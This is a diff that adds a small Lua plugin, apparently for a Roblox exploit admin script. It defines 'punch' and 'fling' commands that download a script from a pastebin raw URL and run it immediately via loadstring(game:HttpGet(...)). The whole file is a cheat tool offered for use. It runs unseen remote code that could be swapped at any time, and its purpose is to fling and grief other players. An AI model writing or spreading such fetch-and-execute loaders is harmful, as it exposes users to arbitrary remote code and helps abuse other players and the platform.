@@ -1,0 +1,16 @@
+local Plugin = {
+	["PluginName"] = "punch",
+	["PluginDescription"] = "R6 Only",
+	["Commands"] = {
+		["fling2/punch/punchtofling"] = {
+			["Description"] = "R6 Only",
+			["Aliases"] = {'fling2', 'punch', 'punchtofling'},
+			["Function"] = function(args,speaker)
+				loadstring(game:HttpGet("https://pastebin.com/raw/1reRgvC7",true))()
+
+			end,
+		},
+	},
+}
+
+return Plugin
